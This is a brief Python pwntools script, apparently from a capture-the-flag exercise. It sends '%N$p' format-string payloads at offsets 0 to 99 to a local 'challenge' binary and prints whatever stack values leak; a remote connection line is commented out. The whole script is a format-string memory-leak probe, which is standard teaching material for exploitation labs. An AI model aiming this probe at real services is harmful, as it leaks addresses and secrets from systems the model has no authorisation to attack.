from pwn import *

elf = context.binary = ELF("challenge",checksec=False)

for i in range(100):
	try:
		p = process(level='error')
		#p = remote("",)
		p.recvuntil('is?: ')
		p.sendline('%{}$p'.format(i).encode())
		p.recvline()
		result = p.recvline().decode()

		if result:
			print(str(i) + ': ' + str(result).strip())
	except EOFError:
		pass	